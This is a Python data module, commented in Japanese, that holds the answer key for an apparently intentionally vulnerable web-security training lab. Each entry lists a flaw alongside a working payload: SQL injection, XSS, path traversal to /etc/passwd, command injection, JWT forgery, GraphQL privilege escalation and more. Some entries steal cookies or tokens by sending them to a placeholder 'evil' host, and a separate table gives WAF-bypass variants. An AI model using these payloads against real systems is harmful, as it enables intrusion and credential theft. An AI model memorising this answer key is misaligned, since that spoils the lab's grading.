"""
脆弱性の正解データ（ground truth）。
app.py（描画）・harness.py（採点）・control.py（パネル）から共通で参照する。
Flask へ依存しないデータのみ。
"""

VULN_MAP = [
    {"id": "SQLi-1",  "site": "bank", "type": "SQL Injection",        "method": "POST", "endpoint": "/login",            "param": "username / password",  "payload": "username=admin'-- -  (任意パスワードで認証回避)",                          "notes": "文字列連結でSQLを組み立てており、エラーメッセージも漏えいする"},
    {"id": "SQLi-2",  "site": "ec",   "type": "SQL Injection",        "method": "GET",  "endpoint": "/blog/search",      "param": "q",                    "payload": "/blog/search?q=' UNION SELECT id,username,password FROM users-- -",       "notes": "記事検索のLIKE句に対するUNIONインジェクションが可能（postsを生SQLで検索）"},
    {"id": "XSS-R",   "site": "ec",   "type": "Reflected XSS",        "method": "GET",  "endpoint": "/blog/search",      "param": "q",                    "payload": "/blog/search?q=<script>alert(document.cookie)</script>",                   "notes": "記事検索クエリをエスケープせずにMarkup()で描画している"},
    {"id": "XSS-S",   "site": "ec",   "type": "Stored XSS",           "method": "POST", "endpoint": "/blog/<id>/comment","param": "body",                 "payload": "body=<img src=x onerror=alert(1)>",                                        "notes": "DBに保存したコメントをテンプレートでそのまま描画している"},
    {"id": "XSS-S2",  "site": "ec",   "type": "Stored XSS",           "method": "POST", "endpoint": "/blog/new",         "param": "title / body",         "payload": "body=<svg onload=alert(document.domain)>",                                 "notes": "投稿本文をエスケープせずに描画している"},
    {"id": "XSS-S3",  "site": "ec",   "type": "Stored XSS",           "method": "POST", "endpoint": "/orders/<id>/review","param": "body",                 "payload": "購入後に POST /orders/<id>/review で body=<img src=x onerror=alert(document.cookie)> を投稿",  "notes": "購入者レビュー本文をエスケープせず描画している。商品詳細ページに保存・反映され、その商品を見た全ユーザーで発火する（蓄積型XSS）"},
    {"id": "XSS-D",   "site": "ec",   "type": "DOM-based XSS",        "method": "GET",  "endpoint": "/shop",             "param": "location.hash",        "payload": "/shop#q=<img src=x onerror=alert(1)>",                                     "notes": "店舗内検索のキーワード（URLハッシュ #q=）をinnerHTMLへ直接設定している"},
    {"id": "CSRF-1",  "site": ["bank", "ec"], "type": "CSRF",          "method": "POST", "endpoint": "/change-password",  "param": "new_password",         "payload": "外部HTMLから <form action=.../change-password method=POST> を自動送信",     "notes": "CSRFトークンがない。/change-password は VulnBank と VulnEC で共通のアカウント機能（両サイトで1件として計上）"},
    {"id": "CSRF-2",  "site": "bank", "type": "CSRF",                  "method": "POST", "endpoint": "/transfer",         "param": "to_user_id, amount",   "payload": "外部から to_user_id=1&amount=9999 を自動POST",                              "notes": "CSRFトークンがない"},
    {"id": "IDOR-1",  "site": "bank", "type": "IDOR",                  "method": "GET",  "endpoint": "/profile/<id>",     "param": "user_id (path)",       "payload": "/profile/1  (admin の secret_note が露出)",                                 "notes": "所有者確認がなく、secret_noteが露出する"},
    {"id": "IDOR-2",  "site": "ec",   "type": "IDOR",                  "method": "GET",  "endpoint": "/orders/<id>",      "param": "order_id (path)",      "payload": "/orders/1, /orders/2 … (他人の注文を閲覧)",                                 "notes": "所有者確認がない"},
    {"id": "PATH-1",  "site": "ec",   "type": "Path Traversal",        "method": "GET",  "endpoint": "/shop/manual",      "param": "file",                 "payload": "/shop/manual?file=../../../../etc/passwd",                                  "notes": "商品マニュアル配布。fileをサニタイズせずにos.path.joinしている"},
    {"id": "CMD-1",   "site": "ec",   "type": "Command Injection",     "method": "POST", "endpoint": "/admin/image-import","param": "image_url",            "payload": "image_url=http://example.com/a.jpg | id #   (取得画像を curl|convert で処理するため shell経由。末尾の | convert を # で無効化)", "notes": "curl … {image_url} | convert … をshell=Trueで実行。URLを無加工連結しており、URL経由で任意コマンドを実行できる"},
    {"id": "AUTHZ-1", "site": "ec",   "type": "Broken Access Control", "method": "GET",  "endpoint": "/admin",            "param": "?admin=1",             "payload": "/admin?admin=1  (未ログインでも管理画面・全平文PWを閲覧)",                    "notes": "URLパラメータで権限チェックを回避できる"},
    {"id": "AUTHZ-2", "site": "ec",   "type": "Broken Access Control（BFLA・商品管理）","method": "POST","endpoint": "/admin/products",   "param": "name / price",         "payload": "利用者でログインし POST /admin/products/new で商品を追加（/edit・/delete も同様）", "notes": "店舗担当者向けの商品管理に機能レベル認可が無く、利用者でも商品を作成/編集/削除できる（BFLA・CWE-862）"},
    {"id": "AUTHZ-3", "site": "ec",   "type": "Broken Access Control（権限昇格 / Privilege Escalation）","method": "POST","endpoint": "/admin/users/<id>/role","param": "role",        "payload": "利用者でログインし POST /admin/users/5/role に role=admin を送って自分を管理者へ昇格", "notes": "管理者向けのユーザー管理に認可が無く、role もクライアント任せ。垂直権限昇格＋マスアサインメント（CWE-269/862/915）"},
    {"id": "AUTHZ-4", "site": "ec",   "type": "Broken Access Control（BFLA・ブログ管理）","method": "POST","endpoint": "/blog/<id>/edit",   "param": "title / body",         "payload": "利用者でログインし POST /blog/1/edit で他人(店舗)の記事を改ざん（/delete も同様）", "notes": "店舗担当者向けの記事管理に機能レベル/所有者認可が無く、利用者でも任意記事を改ざん/削除できる（BFLA・CWE-862）"},
    {"id": "BIZ-1",   "site": "bank", "type": "Business Logic",        "method": "POST", "endpoint": "/transfer",         "param": "amount",               "payload": "to_user_id=2&amount=-9999  (相手から残高を奪取)",                            "notes": "負の金額指定により相手の残高を奪取できる"},
    {"id": "BIZ-2",   "site": "ec",   "type": "Business Logic",        "method": "POST", "endpoint": "/shop/buy",         "param": "price",                "payload": "product_id=3&price=0&quantity=1  (hidden価格を改ざんし無料購入)",            "notes": "クライアント側の価格を信頼しており、改ざんで無料購入できる"},
    {"id": "BIZ-3",   "site": "ec",   "type": "Business Logic",        "method": "POST", "endpoint": "/shop/buy",         "param": "coupon",               "payload": "coupon=VIP50 を並列に複数リクエスト (max_uses超過)",                          "notes": "クーポンの確認と使用処理が分離しており、競合状態が発生する"},
    {"id": "AUTH-1",  "site": "ec",   "type": "Auth Weakness",         "method": "-",    "endpoint": "DB: users.password","param": "-",                    "payload": "/admin?admin=1 で平文PWが一覧表示される",                                    "notes": "パスワードが平文で保存されている"},
    {"id": "AUTH-2",  "site": "bank", "type": "Auth Weakness",         "method": "-",    "endpoint": "app.secret_key",    "param": "-",                    "payload": "secret_key='secret123' を用いて session Cookie を偽造",                       "notes": "弱い固定のsecret_keyがハードコードされている"},
    {"id": "AUTH-3",  "site": "bank", "type": "Session Fixation",      "method": "POST", "endpoint": "/login",            "param": "-",                    "payload": "ログイン前後で session Cookie が変化しない (固定化)",                         "notes": "ログイン後にセッションIDが再生成されない"},
    {"id": "COOKIE-1","site": "bank", "type": "Cookie No HttpOnly（HttpOnly 属性の不備）","method": "-","endpoint": "Set-Cookie (session)", "param": "session Cookie", "payload": "ログイン時の Set-Cookie に HttpOnly が無く、XSS で document.cookie からセッションを窃取できる", "notes": "SESSION_COOKIE_HTTPONLY=False。HttpOnly 欠如によりスクリプトから読み取れる（CWE-1004）"},
    {"id": "COOKIE-2","site": "bank", "type": "Cookie No Secure（Secure 属性の不備）",    "method": "-","endpoint": "Set-Cookie (session)", "param": "session Cookie", "payload": "HTTPS なのに Set-Cookie に Secure が無く、平文 HTTP に誘導されるとセッションが平文送信される", "notes": "SESSION_COOKIE_SECURE=False。Secure 欠如により平文経路で送出されうる（CWE-614）"},
    {"id": "JWT-1",   "site": "board","type": "JWT alg=none 受理",       "method": "GET",  "endpoint": "/api/me",           "param": "Authorization: Bearer", "payload": "header を {\"alg\":\"none\"} にして署名を空にし role=admin を偽造",          "notes": "verify が alg=none を受理し署名を検証しない"},
    {"id": "JWT-2",   "site": "board","type": "JWT 署名未検証",          "method": "GET",  "endpoint": "/api/tasks",        "param": "Authorization: Bearer", "payload": "署名を改変したトークンで uid=1 を指定し他人（管理者）のタスクを取得",        "notes": "decode_unverified で署名検証を行わずクレームを信頼する"},
    {"id": "JWT-3",   "site": "board","type": "JWT 弱い署名鍵",          "method": "GET",  "endpoint": "/api/me",           "param": "Authorization: Bearer", "payload": "HS256 の鍵 secret123 を総当りで特定し role=admin を署名",                    "notes": "HS256 を弱い固定鍵で署名している（オフライン総当りで偽造可能）"},
    {"id": "JWT-4",   "site": "board","type": "JWT 機微情報の格納",       "method": "POST", "endpoint": "/api/login",        "param": "token payload",         "payload": "/api/login のトークン payload に平文 password/secret_note が含まれる",       "notes": "機微情報をトークンに格納している（base64 は暗号化ではない）"},
    {"id": "JWT-5",   "site": "board","type": "JWT 無期限トークン",       "method": "POST", "endpoint": "/api/login",        "param": "token payload",         "payload": "exp が無く、取得したトークンが失効せず永久に有効",                          "notes": "exp クレームが無く、検証時も有効期限を確認しない"},
    {"id": "JWT-6",   "site": "board","type": "JWT alg 混同 (RS256→HS256)","method": "GET", "endpoint": "/api/admin",        "param": "Authorization: Bearer", "payload": "/api/pubkey の公開鍵を HMAC 鍵に使い HS256 で署名して検証を通過",           "notes": "RS256 を想定した公開鍵を HMAC 鍵として受理する（アルゴリズム混同）"},
    {"id": "JWT-7",   "site": "board","type": "DOM-based XSS（SPA・トークン窃取）","method": "GET","endpoint": "/",            "param": "msg",                   "payload": "/?msg=<img src=x onerror=\"new Image().src='//evil/?t='+localStorage.jwt\">",  "notes": "SPA が msg をエスケープせず描画し、JWT を localStorage に保持するため XSS でトークンを窃取できる"},
    {"id": "MASS-1",  "site": "board","type": "Mass Assignment（登録時の権限昇格）","method": "POST","endpoint": "/api/register",  "param": "role",                  "payload": "{\"username\":\"x\",\"password\":\"p\",\"role\":\"admin\"} で管理者として登録",   "notes": "クライアント提供の role をそのまま保存し、登録だけで admin に昇格できる"},
    {"id": "ENUM-1",  "site": "board","type": "User Enumeration（アカウント列挙）","method": "POST","endpoint": "/api/register",   "param": "username",              "payload": "既存ユーザー名で登録すると 409『already taken』が返り存在を判別できる",         "notes": "存在するユーザー名と存在しないユーザー名で応答が異なる"},
    {"id": "ENUM-2",  "site": "bank", "type": "User Enumeration（アカウント列挙）","method": "GET", "endpoint": "/transfer/lookup",  "param": "account (query)",       "payload": "/transfer/lookup?account=1 … 連番で口座番号→口座名義人(username)を未認証で列挙", "notes": "認証不要で口座番号(=user.id)から名義人を引け、連番列挙でユーザーを網羅できる（CWE-204/IDOR 的情報露出）"},
    {"id": "PWPOLICY-1","site":"board","type": "Weak Password Policy（パスワードポリシー不在）","method":"POST","endpoint":"/api/register","param":"password",        "payload": "password=\"1\" のような短く単純なパスワードでも登録できる",                    "notes": "パスワードの長さ・複雑性を一切検証していない"},
    {"id": "GQL-1",   "site": "graphql","type": "GraphQL Introspection 有効（スキーマ開示）",   "method": "POST", "endpoint": "/graphql", "param": "query",            "payload": "{ __schema { types { name fields { name } } } } でスキーマ全体を取得",        "notes": "本番でイントロスペクションを無効化しておらず、全スキーマが開示される"},
    {"id": "GQL-2",   "site": "graphql","type": "GraphiQL 公開（本番でのエクスプローラ露出）",   "method": "GET",  "endpoint": "/graphql", "param": "-",                "payload": "GET /graphql をブラウザで開くと GraphiQL（クエリエクスプローラ）が表示される", "notes": "本番で GraphiQL エクスプローラを公開している"},
    {"id": "GQL-3",   "site": "graphql","type": "GraphQL BOLA（オブジェクト/フィールド認可欠如）","method": "POST","endpoint": "/graphql","param": "user(id)",          "payload": "{ user(id:1){ email secretNote password } } で他人の機微情報を取得",          "notes": "user(id) リゾルバに所有者/権限チェックが無く、任意ユーザーの機微フィールドを返す"},
    {"id": "GQL-4",   "site": "graphql","type": "GraphQL BFLA（権限昇格・マスアサインメント）","method": "POST","endpoint": "/graphql","param": "updateUser(role)", "payload": "mutation { updateUser(id:5, role:\"admin\"){ role } } で任意ユーザーを admin 昇格", "notes": "updateUser に認可が無く（BFLA）、role も渡せる（マスアサインメント）"},
    {"id": "GQL-5",   "site": "graphql","type": "GraphQL 引数の SQL インジェクション",           "method": "POST", "endpoint": "/graphql","param": "posts(search/order)","payload": "{ posts(search:\"' UNION SELECT 1,2,password,username,5 FROM users-- -\"){ title body } }", "notes": "search/order を生 SQL に連結しており、引数経由で SQLi できる"},
    {"id": "GQL-6",   "site": "graphql","type": "GraphQL クエリ深さ/バッチ制限なし（DoS）",       "method": "POST", "endpoint": "/graphql","param": "query / batch",    "payload": "深い循環クエリ（user{posts{author{posts…}}}）やバッチ配列を無制限に受理",      "notes": "クエリ深さ/複雑度・バッチ数の制限が無く、DoS やレート制限回避に使える"},
    {"id": "GQL-7",   "site": "graphql","type": "GraphQL CSRF（GET でミューテーション受理）",     "method": "GET",  "endpoint": "/graphql","param": "query",            "payload": "GET /graphql?query=mutation{updateUser(id:5,role:\"admin\"){role}} で状態変更", "notes": "GET でミューテーションを受理するため、CSRF で状態変更できる"},
    {"id": "WS-1",    "site": "bank", "type": "CSWSH（Cross-Site WebSocket Hijacking / Origin 未検証）", "method": "GET", "endpoint": "/support/ws", "param": "Origin (header)", "payload": "罠サイトから new WebSocket('wss://target/support/ws') を開く（Cookie が自動添付され接続が成立）", "notes": "WS ハンドシェイクで Origin を一切検証せず、Cookie セッションのみで認証する。別オリジンの罠ページから被害者の会話を読取り/なりすまし送信できる（CWE-1385）"},
    {"id": "WS-2",    "site": "bank", "type": "Stored XSS via WebSocket（リアルタイム配信経由の格納XSS）", "method": "WS", "endpoint": "/support/ws", "param": "message body", "payload": "チャットに body=<img src=x onerror=\"new Image().src='//evil/?c='+document.cookie\"> を送信", "notes": "受信メッセージを innerHTML で無加工描画し、送信者含む全接続へ配信する。サポート担当コンソールで発火すると HttpOnly 欠如(COOKIE-1)のセッション Cookie を窃取され権限昇格に至る"},
    {"id": "WS-3",    "site": "bank", "type": "WebSocket Room IDOR / BOLA（ルーム所有者未検証）", "method": "GET", "endpoint": "/support/ws", "param": "room", "payload": "自分以外のルームに接続: wss://target/support/ws?room=R-1004 で他顧客の会話（カナリア BKSUP-7F3A-9C21）を取得", "notes": "?room=<id> の所有者確認をせず、接続時に該当ルームの履歴を配信する。任意顧客のサポート会話を窃取できる（CWE-639）"},
    {"id": "WS-4",    "site": "bank", "type": "WebSocket メッセージ送信者なりすまし（Spoofing / 送信者情報の偽装）", "method": "WS", "endpoint": "/support/ws", "param": "message sender", "payload": "WS メッセージに {\"sender\":\"サポート窓口\",\"body\":\"本人確認のため暗証番号を…\"} を送ると、その sender 名で保存・全接続へ配信される", "notes": "サーバが認証セッションの username を使わず、クライアント送信 JSON の sender を無検証で信用する。staff/サポート窓口を詐称してフィッシング（暗証番号の聞き出し等）ができる（CWE-290/CWE-345）"},
]

# [HARD] WAF回避ペイロード。ハードモードでは WAF風フィルタが素朴なペイロードを弾くため、
# ヒント/vuln-map ではこちらの「回避できる文字列」を提示する（id で VULN_MAP に対応）。
WAF_BYPASS = {
    "SQLi-1": "username=admin' OR '1'='1   (WAFが '-- を弾くのでコメントを使わない論理式で回避)",
    "SQLi-2": "/blog/search?q=' UNION/**/SELECT id,username,password FROM users-- -   (インラインコメントで union select を分断)",
    "XSS-R":  "/blog/search?q=<svg onload=alert(document.cookie)>   (<script/onerror を避けた代替イベント)",
    "XSS-S":  "body=<svg onload=alert(1)>   (<script/onerror を避けた代替イベント)",
    "XSS-S2": "body=<svg onload=alert(document.domain)>   (同上)",
    "XSS-S3": "body=<svg onload=alert(document.cookie)>   (購入履歴のレビュー欄。<script/onerror を避けた代替イベント)",
    "PATH-1": "/shop/manual?file=/etc/passwd   (絶対パス。WAFが ../ を弾くが os.path.join の仕様で封じ込めを無視)",
    "CMD-1":  "image_url=http://x/a.jpg | id #   (WAFが ; id を弾くのでパイプで回避。末尾の | convert は # でコメントアウト。%0a 改行でも可)",
}


# ---------------------------------------------------------------------------
# サイト所属の判定。`site` は通常は文字列だが、複数サイトで共通のエンドポイント
# （例: /change-password は VulnBank と VulnEC で共通）はリストで複数サイトに属する。
# その場合でも VULN_MAP 上は 1 エントリ＝1 件として計上する（all では当然 1 件、
# bank 単独・ec 単独の双方でも 1 件ずつ出る）。
# ---------------------------------------------------------------------------
def vuln_sites(v):
    """脆弱性が属するサイトの集合を返す（site は文字列 または 文字列リスト）。"""
    s = v.get("site")
    if isinstance(s, (list, tuple, set)):
        return set(s)
    return {s} if s else set()


def vuln_in_site(v, site):
    """指定サイト（'all' または特定サイト）でこの脆弱性が対象になるか。"""
    if site == "all":
        return True
    sites = vuln_sites(v)
    return site in sites or "common" in sites


def vuln_site_label(v):
    """表示用に所属サイトを連結した文字列（例 'bank/ec'、単一なら 'ec'）。"""
    return "/".join(sorted(vuln_sites(v)))
